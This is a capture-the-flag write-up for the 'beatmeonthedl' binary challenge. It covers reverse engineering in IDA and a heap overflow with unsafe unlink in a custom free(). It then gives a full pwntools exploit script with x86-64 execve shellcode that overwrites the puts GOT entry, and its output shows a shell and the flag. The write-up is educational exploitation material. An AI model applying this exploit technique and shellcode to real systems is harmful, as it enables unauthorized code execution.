# Writeup
The challenge gives the beatmeonthedl executable and that's all.
Doing a reverse engineering with IDA, we can note:

1- The main is a organized menu, pretty legible.

![beatmeonthedl1](https://cloud.githubusercontent.com/assets/1280700/25596814/9264fb4a-2ea1-11e7-9129-2dd659003e38.png)

2- The reqlist is stored in the .bss area, more specifically at address 0x609e88. It is an array
of pointers (max of 31 places).

![beatmeonthedl2](https://cloud.githubusercontent.com/assets/1280700/25596815/9267929c-2ea1-11e7-84ba-67a7e1bb1ae3.png)

3- There are buffer overflow vulnerabilities in the add_request and update_request functions. While
the allocated memory for a request string is of 56 bytes (line 15), it allows writing 128 bytes
(line 23).  

![beatmeonthedl3](https://cloud.githubusercontent.com/assets/1280700/25596816/9274b666-2ea1-11e7-9154-d186d88da477.png)

The buffer overflow vulnerabilities cause weird things when deleting an overflowed buffer. After
inspecting for a while through gdb, I noticed that it was possible to write anything in reqlist.
For example, after deleting the input *"A"\*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" +
"\x80\x9e\x60\x00\x00\x00\x00\x00" + "\x90\x9f\x60\x00\x00\x00\x00\x00"*, it writes 0x609f90 in
0x609e98 (0x609e80 + 0x18). 

Using the usual free function from stdlib, this does not happen, and an runtime error of *free():
invalid next size (fast)* occurs. This exaplains why the free function is embedded in the
beatmeonthedl executable.

After confirming this strange behavior, I wrote the script below which gave me a shell.

```python
from pwn import *

p = process("./beatmeonthedl")
#p = remote("beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me", 6969)
res = p.recvuntil("Enter username: ")
p.sendline("mcfly")
res = p.recvuntil("Enter Pass: ")
p.sendline("awesnap")
#adds foir request texts:
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("CCCCCCCC")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("DDDDDDDD")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("EEEEEEEE")
res = p.recvuntil("| ")
p.sendline("1")
res = p.recvuntil("Request text > ")
p.sendline("FFFFFFFF")

#replaces the third text, overflowing the fourth
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("2")
res = p.recvuntil("data: ")
p.sendline("A"*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x80\x9e\x60\x00\x00\x00\x00\x00" + "\x90\x9f\x60\x00\x00\x00\x00\x00")

#deletes the third text, causing a bug on the free function and writing 0x609f90 at 0x609e80 + 0x18 (fourth position)
res = p.recvuntil("| ")
p.sendline("3")
res = p.recvuntil("choice: ")
p.sendline("2")

#writes our shellcode at 0x609f90 (the fourth position)
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("3")
res = p.recvuntil("data: ")
p.sendline("\x90"*10 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

#replaces the first text, overflowing the second
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("0")
res = p.recvuntil("data: ")
p.sendline("A"*56 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x70\x9e\x60\x00\x00\x00\x00\x00" + "\x58\x99\x60\x00\x00\x00\x00\x00")

#deletes the third text, causing a bug on the free function and writing 0x609958 at 0x609e70 + 0x18 (second position)
res = p.recvuntil("| ")
p.sendline("3")
res = p.recvuntil("choice: ")
p.sendline("0")

#writes the address of our shellcode in the put got
res = p.recvuntil("| ")
p.sendline("4")
res = p.recvuntil("choice: ")
p.sendline("1")
res = p.recvuntil("data: ")
p.sendline("\x90\x9f\x60\x00\x00\x00\x00\x00")

p.interactive()
```

```
[+] Opening connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me on
port 6969: Done
[*] Switching to interactive mode
$ ls
beatmeonthedl
flag
$ cat flag
The flag is: 3asy p33zy h3ap hacking!!
```
